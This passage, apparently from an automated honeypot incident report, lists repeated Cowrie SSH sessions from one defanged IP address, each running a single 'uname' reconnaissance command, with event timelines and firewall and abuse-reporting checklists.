| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:13` | `cowrie.session.connect` |
| `2026-08-20 19:26:13` | `cowrie.client.version` |
| `2026-08-20 19:26:14` | `cowrie.client.kex` |
| `2026-08-20 19:26:17` | `cowrie.login.success` |
| `2026-08-20 19:26:19` | `cowrie.session.params` |
| `2026-08-20 19:26:19` | `cowrie.command.input` |
| `2026-08-20 19:26:19` | `cowrie.log.closed` |
| `2026-08-20 19:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8093f7c6e57

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:15` | `cowrie.session.connect` |
| `2026-08-20 19:26:15` | `cowrie.client.version` |
| `2026-08-20 19:26:17` | `cowrie.client.kex` |
| `2026-08-20 19:26:19` | `cowrie.login.success` |
| `2026-08-20 19:26:21` | `cowrie.session.params` |
| `2026-08-20 19:26:21` | `cowrie.command.input` |
| `2026-08-20 19:26:21` | `cowrie.log.closed` |
| `2026-08-20 19:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f343b4e41896

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:15` | `cowrie.session.connect` |
| `2026-08-20 19:26:15` | `cowrie.client.version` |
| `2026-08-20 19:26:19` | `cowrie.client.kex` |
| `2026-08-20 19:26:38` | `cowrie.login.success` |
| `2026-08-20 19:26:40` | `cowrie.session.params` |
| `2026-08-20 19:26:40` | `cowrie.command.input` |
| `2026-08-20 19:26:42` | `cowrie.log.closed` |
| `2026-08-20 19:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-135b0c0e0401

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:16` | `cowrie.session.connect` |
| `2026-08-20 19:26:16` | `cowrie.client.version` |
| `2026-08-20 19:26:17` | `cowrie.client.kex` |
| `2026-08-20 19:26:26` | `cowrie.login.success` |
| `2026-08-20 19:26:30` | `cowrie.session.params` |
| `2026-08-20 19:26:30` | `cowrie.command.input` |
| `2026-08-20 19:26:31` | `cowrie.log.closed` |
| `2026-08-20 19:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad760ecc14b9

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:17` | `cowrie.session.connect` |
| `2026-08-20 19:26:17` | `cowrie.client.version` |
| `2026-08-20 19:26:17` | `cowrie.client.kex` |
| `2026-08-20 19:26:28` | `cowrie.login.success` |
| `2026-08-20 19:26:34` | `cowrie.session.params` |
| `2026-08-20 19:26:34` | `cowrie.command.input` |
| `2026-08-20 19:26:34` | `cowrie.log.closed` |
| `2026-08-20 19:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ecf1fb034b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:17` | `cowrie.session.connect` |
| `2026-08-20 19:26:17` | `cowrie.client.version` |
| `2026-08-20 19:26:19` | `cowrie.client.kex` |
| `2026-08-20 19:26:22` | `cowrie.login.success` |
| `2026-08-20 19:26:23` | `cowrie.session.params` |
| `2026-08-20 19:26:23` | `cowrie.command.input` |
| `2026-08-20 19:26:24` | `cowrie.log.closed` |
| `2026-08-20 19:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c77b1dc410fe

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:19` | `cowrie.session.connect` |
| `2026-08-20 19:26:19` | `cowrie.client.version` |
| `2026-08-20 19:26:20` | `cowrie.client.kex` |
| `2026-08-20 19:26:23` | `cowrie.login.success` |
| `2026-08-20 19:26:26` | `cowrie.session.params` |
| `2026-08-20 19:26:26` | `cowrie.command.input` |
| `2026-08-20 19:26:27` | `cowrie.log.closed` |
| `2026-08-20 19:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b734ef7d52bf

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:19` | `cowrie.session.connect` |
| `2026-08-20 19:26:19` | `cowrie.client.version` |
| `2026-08-20 19:26:20` | `cowrie.client.kex` |
| `2026-08-20 19:26:23` | `cowrie.login.success` |
| `2026-08-20 19:26:24` | `cowrie.session.params` |
| `2026-08-20 19:26:24` | `cowrie.command.input` |
| `2026-08-20 19:26:34` | `cowrie.log.closed` |
| `2026-08-20 19:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cef484125c1

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:20` | `cowrie.session.connect` |
| `2026-08-20 19:26:20` | `cowrie.client.version` |
| `2026-08-20 19:26:21` | `cowrie.client.kex` |
| `2026-08-20 19:26:25` | `cowrie.login.success` |
| `2026-08-20 19:26:28` | `cowrie.session.params` |
| `2026-08-20 19:26:28` | `cowrie.command.input` |
| `2026-08-20 19:26:28` | `cowrie.log.closed` |
| `2026-08-20 19:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5360002db66d

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:21` | `cowrie.session.connect` |
| `2026-08-20 19:26:21` | `cowrie.client.version` |
| `2026-08-20 19:26:22` | `cowrie.client.kex` |
| `2026-08-20 19:26:24` | `cowrie.login.success` |
| `2026-08-20 19:26:25` | `cowrie.session.params` |
| `2026-08-20 19:26:25` | `cowrie.command.input` |
| `2026-08-20 19:26:26` | `cowrie.log.closed` |
| `2026-08-20 19:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f2a699e77c0

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:22` | `cowrie.session.connect` |
| `2026-08-20 19:26:22` | `cowrie.client.version` |
| `2026-08-20 19:26:25` | `cowrie.client.kex` |
| `2026-08-20 19:26:29` | `cowrie.login.success` |
| `2026-08-20 19:26:33` | `cowrie.session.params` |
| `2026-08-20 19:26:33` | `cowrie.command.input` |
| `2026-08-20 19:26:35` | `cowrie.log.closed` |
| `2026-08-20 19:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fa87c74b08b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:22` | `cowrie.session.connect` |
| `2026-08-20 19:26:22` | `cowrie.client.version` |
| `2026-08-20 19:26:23` | `cowrie.client.kex` |
| `2026-08-20 19:26:25` | `cowrie.login.success` |
| `2026-08-20 19:26:31` | `cowrie.session.params` |
| `2026-08-20 19:26:31` | `cowrie.command.input` |
| `2026-08-20 19:26:34` | `cowrie.log.closed` |
| `2026-08-20 19:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ba3b1e31955

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 75s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:22` | `cowrie.session.connect` |
| `2026-08-20 19:26:22` | `cowrie.client.version` |
| `2026-08-20 19:26:23` | `cowrie.client.kex` |
| `2026-08-20 19:26:28` | `cowrie.login.success` |
| `2026-08-20 19:27:35` | `cowrie.session.params` |
| `2026-08-20 19:27:35` | `cowrie.command.input` |
| `2026-08-20 19:27:37` | `cowrie.log.closed` |
| `2026-08-20 19:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a745859e0d5f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:23` | `cowrie.session.connect` |
| `2026-08-20 19:26:23` | `cowrie.client.version` |
| `2026-08-20 19:26:23` | `cowrie.client.kex` |
| `2026-08-20 19:26:26` | `cowrie.login.success` |
| `2026-08-20 19:26:32` | `cowrie.session.params` |
| `2026-08-20 19:26:32` | `cowrie.command.input` |
| `2026-08-20 19:26:34` | `cowrie.log.closed` |
| `2026-08-20 19:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31e8b63b0776

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:24` | `cowrie.session.connect` |
| `2026-08-20 19:26:24` | `cowrie.client.version` |
| `2026-08-20 19:26:25` | `cowrie.client.kex` |
| `2026-08-20 19:26:28` | `cowrie.login.success` |
| `2026-08-20 19:26:30` | `cowrie.session.params` |
| `2026-08-20 19:26:30` | `cowrie.command.input` |
| `2026-08-20 19:26:31` | `cowrie.log.closed` |
| `2026-08-20 19:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47fe317356dd

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:24` | `cowrie.session.connect` |
| `2026-08-20 19:26:24` | `cowrie.client.version` |
| `2026-08-20 19:26:25` | `cowrie.client.kex` |
| `2026-08-20 19:26:26` | `cowrie.login.success` |
| `2026-08-20 19:26:28` | `cowrie.session.params` |
| `2026-08-20 19:26:28` | `cowrie.command.input` |
| `2026-08-20 19:26:29` | `cowrie.log.closed` |
| `2026-08-20 19:26:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01bd961d126d

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:26` | `cowrie.session.connect` |
| `2026-08-20 19:26:26` | `cowrie.client.version` |
| `2026-08-20 19:26:26` | `cowrie.client.kex` |
| `2026-08-20 19:26:29` | `cowrie.login.success` |
| `2026-08-20 19:26:33` | `cowrie.session.params` |
| `2026-08-20 19:26:33` | `cowrie.command.input` |
| `2026-08-20 19:26:38` | `cowrie.log.closed` |
| `2026-08-20 19:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-305edf88ab74

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:27` | `cowrie.session.connect` |
| `2026-08-20 19:26:27` | `cowrie.client.version` |
| `2026-08-20 19:26:27` | `cowrie.client.kex` |
| `2026-08-20 19:26:45` | `cowrie.login.success` |
| `2026-08-20 19:26:48` | `cowrie.session.params` |
| `2026-08-20 19:26:48` | `cowrie.command.input` |
| `2026-08-20 19:26:48` | `cowrie.log.closed` |
| `2026-08-20 19:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2713beb1fec2

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:28` | `cowrie.session.connect` |
| `2026-08-20 19:26:28` | `cowrie.client.version` |
| `2026-08-20 19:26:29` | `cowrie.client.kex` |
| `2026-08-20 19:26:33` | `cowrie.login.success` |
| `2026-08-20 19:26:43` | `cowrie.session.params` |
| `2026-08-20 19:26:43` | `cowrie.command.input` |
| `2026-08-20 19:26:44` | `cowrie.log.closed` |
| `2026-08-20 19:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b8896c296f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:28` | `cowrie.session.connect` |
| `2026-08-20 19:26:28` | `cowrie.client.version` |
| `2026-08-20 19:26:31` | `cowrie.client.kex` |
| `2026-08-20 19:26:34` | `cowrie.login.success` |
| `2026-08-20 19:26:37` | `cowrie.session.params` |
| `2026-08-20 19:26:37` | `cowrie.command.input` |
| `2026-08-20 19:26:44` | `cowrie.log.closed` |
| `2026-08-20 19:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df1d55ec0798

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:30` | `cowrie.session.connect` |
| `2026-08-20 19:26:31` | `cowrie.client.version` |
| `2026-08-20 19:26:34` | `cowrie.client.kex` |
| `2026-08-20 19:26:37` | `cowrie.login.success` |
| `2026-08-20 19:26:40` | `cowrie.session.params` |
| `2026-08-20 19:26:40` | `cowrie.command.input` |
| `2026-08-20 19:26:40` | `cowrie.log.closed` |
| `2026-08-20 19:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-691d0febd5c6

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:31` | `cowrie.session.connect` |
| `2026-08-20 19:26:31` | `cowrie.client.version` |
| `2026-08-20 19:26:31` | `cowrie.client.kex` |
| `2026-08-20 19:26:42` | `cowrie.login.success` |
| `2026-08-20 19:26:46` | `cowrie.session.params` |
| `2026-08-20 19:26:46` | `cowrie.command.input` |
| `2026-08-20 19:26:46` | `cowrie.log.closed` |
| `2026-08-20 19:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941545d899c8

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:31` | `cowrie.session.connect` |
| `2026-08-20 19:26:31` | `cowrie.client.version` |
| `2026-08-20 19:26:34` | `cowrie.client.kex` |
| `2026-08-20 19:26:37` | `cowrie.login.success` |
| `2026-08-20 19:26:38` | `cowrie.session.params` |
| `2026-08-20 19:26:38` | `cowrie.command.input` |
| `2026-08-20 19:26:38` | `cowrie.log.closed` |
| `2026-08-20 19:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c40572f12f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:34` | `cowrie.session.connect` |
| `2026-08-20 19:26:34` | `cowrie.client.version` |
| `2026-08-20 19:26:34` | `cowrie.client.kex` |
| `2026-08-20 19:26:35` | `cowrie.login.success` |
| `2026-08-20 19:26:36` | `cowrie.session.params` |
| `2026-08-20 19:26:36` | `cowrie.command.input` |
| `2026-08-20 19:26:37` | `cowrie.log.closed` |
| `2026-08-20 19:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86ff8aa324f2

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:34` | `cowrie.session.connect` |
| `2026-08-20 19:26:34` | `cowrie.client.version` |
| `2026-08-20 19:26:34` | `cowrie.client.kex` |
| `2026-08-20 19:26:35` | `cowrie.login.success` |
| `2026-08-20 19:26:53` | `cowrie.session.params` |
| `2026-08-20 19:26:53` | `cowrie.command.input` |
| `2026-08-20 19:26:55` | `cowrie.log.closed` |
| `2026-08-20 19:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1d078a42fd2

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:34` | `cowrie.session.connect` |
| `2026-08-20 19:26:34` | `cowrie.client.version` |
| `2026-08-20 19:26:37` | `cowrie.client.kex` |
| `2026-08-20 19:26:40` | `cowrie.login.success` |
| `2026-08-20 19:26:42` | `cowrie.session.params` |
| `2026-08-20 19:26:42` | `cowrie.command.input` |
